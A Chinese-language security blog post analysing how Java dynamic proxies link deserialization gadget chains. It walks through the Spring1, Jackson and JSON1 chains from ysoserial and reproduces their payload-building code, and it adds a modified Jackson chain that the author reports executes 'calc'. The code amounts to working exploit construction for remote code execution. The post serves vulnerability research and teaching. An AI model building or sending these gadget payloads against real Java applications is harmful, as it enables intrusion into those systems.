---
title: 动态代理在java反序列化中的应用
tags:
  - 动态代理
  - 反序列化
  - Jackson
  - JSON1
  - Spring1
categories:
  - - 漏洞分析
top: 230
abbrlink: 42eb2c82
date: 2025-07-29 17:05:59
---

# 动态代理在Java反序列化中的应用
## 动态代理简介
何为代理？当你想要去购买一件商品时，是你会直接找生产商购买还是找商店购买？当你需要购买一辆汽车时你是会找华为、小米还是比亚迪直接购买，还是找4S店购买？  
华为、小米与比亚迪可能遥不可及，你甚至不知道它在哪里，但是华为、小米与比亚迪的4S店却满大街都是。  
对车商来说，向全国各地铺设直营店铺无疑是费时费力费钱的买卖，无论从人力经济性还是渠道扩展来说不是简单活计。  
有时候过江龙确实比不上地头蛇有力量，这时候4S店站出来说，我可以为你负责汽车的销售、维修、保养等工作，我就在中间赚点辛苦钱。车商一看，这感情好，我就只负责车辆的生产就好了，销售就交给你了老弟。
对于客户来说，找厂商直接买车面临着车商在哪、车坏了去哪维修、开一段时间去哪保养等问题。与其直接对接车商不如对接4S店来得更加轻松。
将上面得例子映射到编程问题中，车商就是被代理类，4S店就是代理类，客户就是开发者或者测试维护人员等。代理类可以集中统一地对一类的被代理类进行维护管理，如统一的日志管理，状态检查，条件判断等。  

在编程中，代理是一种常见设计模式，它可以为编程提供更多的灵活性，能够有效地对类与方法的功能进行扩充。  
代理按照代理类创建的时间节点不同又可分为静态代理与动态代理，所谓静态代理即对每一个被代理类均创建一个对应的代理类以代理其功能并按照需要进行扩展，这样就面临一个困境，即如果有很多的需要被代理的类，  
那么就需要手动创建对应数量的代理类，这无疑增加了工作量与复杂度。而动态代理则能很好地屏蔽这个缺陷，动态代理通过代理接口实现了代理类的运行时动态生成，无论存在多少被代理类，  
只要他们实现了相关的接口便可以动态地进行代理类的生成。  

在 `JAVA` 中，动态代理的实现主要依赖于 `Proxy` 类以及相应的 `InvocationHandler` 实现，`Proxy` 类负责代理类的生成，`InvocationHandler` 接口负责目标方法的功能扩展，如统一增加的日志、状态检查等功能。   
因为动态代理能集中统一地对类的方法调用进行操作，其常常在反序列化漏洞利用过程中被用作修改方法默认行为、捕获方法调用异常、连接Gadget片段等。  
<!--more-->
## 动态代理的应用
### 修改方法返回对象
使用 sun.reflect.annotation.AnnotationInvocationHandler 可以修改被代理类方法的返回值，其 invoke 是这样实现的。  
```java
public Object invoke(Object var1, Method var2, Object[] var3) {
        String var4 = var2.getName();
        Class[] var5 = var2.getParameterTypes();
        if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
            return this.equalsImpl(var3[0]);
        } else if (var5.length != 0) {
            throw new AssertionError("Too many parameters for an annotation method");
        } else {
            switch (var4) {
                case "toString":
                    return this.toStringImpl();
                case "hashCode":
                    return this.hashCodeImpl();
                case "annotationType":
                    return this.type;
                default:
                    Object var6 = this.memberValues.get(var4);
                    if (var6 == null) {
                        throw new IncompleteAnnotationException(this.type, var4);
                    } else if (var6 instanceof ExceptionProxy) {
                        throw ((ExceptionProxy)var6).generateException();
                    } else {
                        if (var6.getClass().isArray() && Array.getLength(var6) != 0) {
                            var6 = this.cloneArray(var6);
                        }

                        return var6;
                    }
            }
        }
    }
```
在上面 `invoke` 方法的实现中，最终的返回值为`var6`，而`var6`来自于`memberValues`对象`get`方法的调用，`memberValues`是一个`Map`对象，其值在`AnnotationInvocationHandler`实例化的过程中被赋予，即该值是可控的。  
`memberValues`对象在取值时其`key`为`var4` ，为被调用方法的方法名，即其值是已知的。又因`invoke`方法的返回值为`Object`类型，故`invoke`方法的返回值可以被修改为用户控制的任意一个对象。
`AnnotationInvocationHandler`的这一特性在 `Spring1` 链中有所体现。下面是 `yoserial` 工具创建`Spring1`链的代码。  
```java
public Object getObject(String command) throws Exception {
		// [0]
        Object templates = Gadgets.createTemplatesImpl(command);
		// [1]
        ObjectFactory objectFactoryProxy = (ObjectFactory)Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class, new Class[0]);
		// [2]
        Type typeTemplatesProxy = (Type)Gadgets.createProxy((InvocationHandler)Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler").newInstance(objectFactoryProxy), Type.class, new Class[]{Templates.class});
		// [3]
        Object typeProviderProxy = Gadgets.createMemoitizedProxy(Gadgets.createMap("getType", typeTemplatesProxy), Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"), new Class[0]);
		// [4]
        Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
		// [5]
        Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass"), 0);
		// [6]
        Reflections.setFieldValue(mitp, "methodName", "newTransformer");
		// [7]
        return mitp;
    }
```
在上面的代码中，如果将[1]到[7]看作序列化的过程，那么从[7]到[1]就是反序列化的过程。  
在反序列化的过程中首先被调用的就是`SerializableTypeWrapper$MethodInvokeTypeProvider`的 `readObject` 方法  
```java
private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException {
            inputStream.defaultReadObject();
			// [8]
            Method method = ReflectionUtils.findMethod(this.provider.getType().getClass(), this.methodName);
			// [9]
            this.result = ReflectionUtils.invokeMethod(method, this.provider.getType());
        }
    }
```
在标记[9]的地方`invokeMethod`方法被调用，这是一个反射无参方法调用方法，参数`method`为`Method`对象，`this.provider.getType()`则返回是哪个对象的`method`将被调用。  
众所周知，`TemplatesImpl`类的`newTransformer`方法是一个常用的反序列化链片段，刚好该方法是一个无参方法。 所以如果`method`刚好是`newTransformer`方法，`this.provider.getType()`刚好返回`TemplatesImpl`对象就恰到好处了。  
`method`来自于标记[8]的方法调用。这也是一个反射方法调用，所以只需要在构造`SerializableTypeWrapper$MethodInvokeTypeProvider`对象时设置`methodName`属性为`newTransformer`即可。  
调用方法的问题解决了，还需要调用对象的配合，调用对象来自于`this.provider.getType()`的配合，`this.provider`是一个`TypeProvider`类型，观察其`getType`方法的签名发现该方法返回值类型为`Type`类型，与所需的`TemplatesImpl`类型不匹配。    
一般情况下路走到这里就走到死胡同了，不过通过签名提到的`AnnotationInvocationHandler`的特性我们可以将这个死胡同打穿形成一条新的路。  
`AnnotationInvocationHandler`的`invoke`方法调用可以修改被代理方法的返回值，所以可以创建一个代理类代理 `SerializableTypeWrapper$TypeProvider`类，将`TemplatesImpl`对象以方法名`getType`为`key`放到`AnnotationInvocationHandler`的`memberValues`对象中。  
这便是本节标记[3]处代码的意义。  
到了这里似乎就可以结束了，但是前面忽略了一点就是`getType`本身是返回`Type`类型的，虽然替换了返回结果为`TemplatesImpl`满足了反序列化链的需求，但是`TemplatesImpl`本身并不实现`Type`接口。  
那么便可以继续生成一个代理类让其同时实现`Type`以及`Templates`接口，这便是本节标记[2]处代码的意义。  
`AutowireUtils$ObjectFactoryDelegatingInvocationHandler`的`invoke`方法是这样的。其会从`ObjectFactory` 属性中通过`getObject方`法 获取目标对象，若要使得`getObject`方法返回`TemplatesImpl` 对象，  
则需要再次使用`AnnotationInvocationHandler`代理`ObjectFactory`。 这就是本节标记[1]处代码的意义。  
```java
public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
            String methodName = method.getName();
            if (methodName.equals("equals")) {
                return proxy == args[0];
            } else if (methodName.equals("hashCode")) {
                return System.identityHashCode(proxy);
            } else if (methodName.equals("toString")) {
                return this.objectFactory.toString();
            } else {
                try {
                    return method.invoke(this.objectFactory.getObject(), args);
                } catch (InvocationTargetException var6) {
                    throw var6.getTargetException();
                }
            }
        }
```
通过上面的分析可知，在`Spring1` 链中，多次使用了`AnnotationInvocationHandler`可以修改方法调用的放回值的特性利用动态代理机制完成反序列化利用链片段的连接。  
当然，`AnnotationInvocationHandler`的使用并不是没有限制的。 首先我们从上面`Spring1`链的分析中得知 `AnnotationInvocationHandler`的`invoke`方法在调用完成后返回被修改后的对象，  
该对象要保证能够被接受的变量所兼容，即需要保证接收变量为该返回值的父类父类型，在`Spring1`的例子中invokeMethod的方法签名的第二个参数用于接收修改后的对象，恰好其为`Object`类型为所有类型的父类型所以并没有发生异常。
```java
public static Object invokeMethod(Method method, Object target)
```
而在代理`getType`方法时，因为`getType`方法本身接收的响应类型为`Type`类型，而我们希望响应`TemplatesImpl`类型，所以需要额外借助`AutowireUtils$ObjectFactoryDelegatingInvocationHandler`再创建一个代理类同时代理`Type`以及`Templates`类型以达到目的。  
所以当`AnnotationInvocationHandler`被用作替换对象类型的时候往往不是单独使用的，其往往需要其他代理类来代理特定的类型以避免类型转换异常。  

### 无关方法调用屏蔽
在`Jackson`原生调用链中，往往会遇到的一个问题便是，`TemplatesImpl`对象的`getOutputProperties`方法调用不稳定的问题，当 `getStylesheetDOM` 先于`getOutputProperties`被调用时将导致反序列化失败，  
而在实践中我们发现当这种情况出现时，后面往往无论你重新尝试多少次都不会成功，除非目标系统重启。  
失败的原因在于`getStylesheetDOM`方法调用时`_sdom`的值为空，又因为`_sdom`是一个被`transient`修饰的瞬态变量并不参与`JAVA`原生的序列化于反序列化，所以我们不能为其赋值。
在`Jackson`链的实践中使用了动态代理的一个特性：**使用反射获取一个代理类上的所有方法时，只能获取到其代理的接口方法**。  
具体的操作方法是创建目标类的代理类，代理其某一个接口，如果该接口定义了我们希望调用的方法而没有定义其他的不被希望调用的方法，那么在通过反射获取代理类的方法时只能获取到被代理接口中定义了的方法。  
在`Jacson`链中，即代理`Templates`接口，该接口值定义了一个`getOutputProperties`方法而没有定义`getStylesheetDOM`，故可避免`getStylesheetDOM`方法调用导致的异常退出。  
以下代码是`ysoserial`中生成`Jackson`链`Payload`的代码。  
```java
public static void main(String[] args) throws Exception {
		// [0]
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();
		// [1]
        Object templates = Gadgets.createTemplatesImpl("calc");
		// [2]
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templates);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
		// [3]
        POJONode node = new POJONode(proxy);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        setFieldValue(val, "val", node);
		// [4]
        byte[] serialize = Serializer.serialize(val);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serialize);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
```
在标记代码块[3]中使用了`BadAttributeValueExpException` 作为反序列化的起始点，`BadAttributeValueExpException`是一个比较常用的类，其`readObject`方法调用会触发`val`属性值的`toString`方法。 
将`val`设置为一个`POJONode`对象，其`toString`方法定义在父类`BaseJsonNode`方法中。  
```java
public String toString() {
        return InternalNodeMapper.nodeToString(this);
    }
```
`nodeToString`方法将调用`STD_WRITTER`的`writeValueAsString`方法，该方法在调用过程中会通过反射的方式尝试获取`POJONode`方法实例化时传入参数对象的所有`getter`方法，然后按照获取顺序依次调用。
```java
public static String nodeToString(BaseJsonNode n) {
        try {
            return STD_WRITER.writeValueAsString(_wrapper(n));
        } catch (IOException var2) {
            throw new RuntimeException(var2);
        }
    }
```
`getter`方法的获取顺序是随机的并且会被缓存机制缓存，当`StylesheetDOM`的获取在`OutputProperties`之前时便会因为`_sdom`为空导致程序异常退出。  
![](001.png)
为了处理这个问题使用了`JdkDynamicAopProxy`代理`Templates`接口创建代理类，代理类在通过反射获取方法时只能获取到被代理接口中定义的方法，如此便可以屏蔽掉`getStylesheetDOM`方法，这便是标记代码块[2]处代码的意义。  
### 异常屏蔽
如上一节通过代理接口屏蔽无关方法调用从而屏蔽异常的方式有严格的限制，需要满足恰好被代理接口定义了我们需要的目标方法且没有定义一些其他的可能对结果产生干扰的方法，这种情况往往是可遇不可求的。  
本节将提供另外一种对方法调用异常进行屏蔽的方法。 
`CompositeInvocationHandlerImpl`能够对方法调用异常进行屏蔽的核心在于其能根据方法名对方法的调用进行分流，对于在调用过程中会导致异常的方法通过`AnnotationInvocationHandler`直接替换掉响应结果即可屏蔽可能导致异常的过程调用。  
具体的实现方法是通过将可能导致异常的方法所属类作为`key`，将`AnnotationInvocationHandler`作为`value`放到一个`Map`中，当方法调用时首先尝试从这个`Map`中获取对应的`handler`再使用该`handler`进行实际的方法调用。  
```java
public Object invoke( Object proxy, Method method, Object[] args )
        throws Throwable
    {
        Class cls = method.getDeclaringClass() ;
        InvocationHandler handler =
            (InvocationHandler)classToInvocationHandler.get( cls ) ;
        if (handler == null) {
            if (defaultHandler != null)
                handler = defaultHandler ;
            else {
                ORBUtilSystemException wrapper = ORBUtilSystemException.get(
                    CORBALogDomains.UTIL ) ;
                throw wrapper.noInvocationHandler( "\"" + method.toString() +
                    "\"" ) ;
            }
        }
        return handler.invoke( proxy, method, args ) ;
    }
```
在`JSON1`链中便使用了该方法以屏蔽`getCompositeType`方法调用导致的异常。  
```java
public static Map makeCallerChain(Object payload, Class... ifaces) throws OpenDataException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, Exception, ClassNotFoundException {
        CompositeType rt = new CompositeType("a", "b", new String[]{"a"}, new String[]{"a"}, new OpenType[]{SimpleType.INTEGER});
        TabularType tt = new TabularType("a", "b", rt, new String[]{"a"});
        TabularDataSupport t1 = new TabularDataSupport(tt);
        TabularDataSupport t2 = new TabularDataSupport(tt);
        AdvisedSupport as = new AdvisedSupport();
        as.setTarget(payload);
		// [1]
        InvocationHandler delegateInvocationHandler = (InvocationHandler)Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy", new Object[]{as});
		// [2]
        InvocationHandler cdsInvocationHandler = Gadgets.createMemoizedInvocationHandler(Gadgets.createMap("getCompositeType", rt));
		// [3]
        InvocationHandler invocationHandler = (InvocationHandler)Reflections.newInstance("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl", new Object[0]);
        ((Map)Reflections.getFieldValue(invocationHandler, "classToInvocationHandler")).put(CompositeData.class, cdsInvocationHandler);
        Reflections.setFieldValue(invocationHandler, "defaultHandler", delegateInvocationHandler);
		// [4]
        CompositeData cdsProxy = (CompositeData)Gadgets.createProxy(invocationHandler, CompositeData.class, ifaces);
        JSONObject jo = new JSONObject();
        Map m = new HashMap();
        m.put("t", cdsProxy);
		// [5]
        Reflections.setFieldValue(jo, "properties", m);
        Reflections.setFieldValue(jo, "properties", m);
        Reflections.setFieldValue(t1, "dataMap", jo);
        Reflections.setFieldValue(t2, "dataMap", jo);
		// [6]
        return Gadgets.makeMap(t1, t2);
    }
```
`JSON1`在反序列化的过程中会触发`getCompositeType`方法并产生异常，故使用`CompositeInvocationHandlerImpl`对`CompositeData`类中的`getter`进行分流处理，使用`AnnotationInvocationHandler`直接响应有效对象避免调用过程中的异常。  
而对于需要调用的目标方法（TemplatesImpl的getOutputProperties方法）则使用`JdkDynamicAopProxy`代理进行简单的反射方法调用即可。    
## 拓展
在`JSON1`的例子中我们使用了`CompositeInvocationHandlerImpl`来根据方法声明类来选择不同的`invocationHandler`对方法进行处理，其目的是为了屏蔽`getCompositeType`调用异常，  
同样的在`Jackson`中也存在方法调用异常，不过在这里利用的是代理类获取方法的特性。是否可以将`CompositeInvocationHandlerImpl`用于`Jackson`中呢？
```java
CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();
        Object templates = Gadgets.createTemplatesImpl("calc");

//        AdvisedSupport advisedSupport = new AdvisedSupport();
//        advisedSupport.setTarget(templates);
//        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
//        constructor.setAccessible(true);
//        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
//        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);

        AdvisedSupport as = new AdvisedSupport();
        as.setTarget(templates);
        InvocationHandler delegateInvocationHandler = (InvocationHandler) Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy", new Object[]{as});
        // 此处传入到JdkDynamicAopProxy中的参数也为as，因为StylesheetDomHandler只是用来充数的，其功能并不重要，重要是有而不是功能，因为并不会有方法调用会触发到该处理器的invoke方法
        InvocationHandler StylesheetDomHandler = (InvocationHandler) Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy", new Object[]{as});
        Class<?>[] allIfaces = (Class[])((Class[]) Array.newInstance(Class.class, 2));
        allIfaces[0] = Serializable.class;
        allIfaces[1] = DOM.class;
        // 创建代理类同时代理DOM接口以及Serializable接口，因为getStylesheetDOM方法需要响应一个 DOM 类型对象，但是DOM的几个实现类都没有实现Serializable接口不可序列化
        // 所以需要同时代理 Serializable 接口
        Object o = Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, StylesheetDomHandler);
        //
        InvocationHandler cdsInvocationHandler = Gadgets.createMemoizedInvocationHandler(Gadgets.createMap("getStylesheetDOM", o));
        InvocationHandler invocationHandler = (InvocationHandler)Reflections.newInstance("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl", new Object[0]);
        // getStylesheetDOM的定义类为 TemplatesImpl 所以这里通过 TemplatesImpl.class 索引
        // 当getStylesheetDOM方法被调用是就会使用 cdsInvocationHandler 来进行实际的方法调用
        // cdsInvocationHandler 是一个 AnnotationInvocationHandler 对象可以用来替换返回对象类型。
        ((Map)Reflections.getFieldValue(invocationHandler, "classToInvocationHandler")).put(TemplatesImpl.class, cdsInvocationHandler);
        Reflections.setFieldValue(invocationHandler, "defaultHandler", delegateInvocationHandler);
        Templates cdsProxy = Gadgets.createProxy(invocationHandler, Templates.class);

        POJONode node = new POJONode(cdsProxy);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        setFieldValue(val, "val", node);


        byte[] serialize = Serializer.serialize(val);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serialize);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();

```
运行修改后的`Jackson`链，正常弹出计算器，同时在打印日志中同样可以查看目标方法被成功调用
![](002.png)  
美中不足的是调试时`getOutputProperties`总是被第一个调用。  
## 总结
随着技术的发展以及JDK不断地更新`AnnotationInvocationHandler`的使用被加上了限制，已经不再能够被随意使用，在本文的所有例子中也只有利用代理类本身特性的`Jackson`链还有较为广泛的用武之地。  
虽然如此，但利用动态代理思想解决问题的思路是一以贯之的。在不同的实践中也可能存在着其他其他更具利用价值的`InvocationHandler`值得我们去发掘。攻防对抗就是这样魔高一丈道高一尺，  
只有在攻与防的不断对抗中砥砺前行才能发现更多的思路与技巧。
